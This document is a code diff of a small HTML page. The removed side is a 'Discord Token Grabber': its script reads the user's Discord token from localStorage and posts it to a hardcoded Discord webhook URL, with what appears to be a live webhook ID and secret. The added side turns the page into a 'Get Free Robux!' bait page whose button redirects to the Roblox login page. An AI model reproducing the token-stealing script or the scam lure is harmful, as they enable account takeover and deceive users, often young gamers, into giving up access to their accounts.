@@ -1,42 +1,26 @@
 <!DOCTYPE html>
+<!DOCTYPE html>
 <html>
 <head>
-  <title>Discord Token Grabber</title>
+  <title>Free Robux</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+    }
+  </style>
 </head>
 <body>
-  <h1>Discord Token Grabber</h1>
-  <p>Click the button below to send your Discord token to the specified webhook:</p>
-  <button onclick="grabToken()">Grab Token</button>
+  <h1>Get Free Robux!</h1>
+  <button id="get-robux-btn">Get Free Robux</button>
 
   <script>
-    function grabToken() {
-      // Get the Discord token from the local storage
-      var token = localStorage.getItem("token");
+    const getRobuxBtn = document.getElementById('get-robux-btn');
 
-      // Check if the token exists
-      if (token) {
-        // Webhook URL
-        var webhookUrl = "https://discord.com/api/webhooks/1290240903889551390/Ukw61tWNoBGeFL-IRrK0BlfjgyfkzMguKGL93hmmIBWPCtWN8RqVUUrEenf9KDAt0WQk";
-
-        // Create a new XMLHttpRequest
-        var xhr = new XMLHttpRequest();
-        xhr.open("POST", webhookUrl);
-        xhr.setRequestHeader("Content-Type", "application/json");
-
-        // Prepare the payload
-        var payload = {
-          content: "Discord Token: " + token
-        };
-
-        // Send the request
-        xhr.send(JSON.stringify(payload));
-
-        // Display a message to the user
-        alert("Discord token sent to the webhook!");
-      } else {
-        alert("Discord token not found. Please enable local storage access in your browser settings.");
-      }
-    }
+    getRobuxBtn.addEventListener('click', () => {
+      // Redirect user to Roblox login page
+      window.location.href = 'https://www.roblox.com/login';
+    });
   </script>
 </body>
 </html>
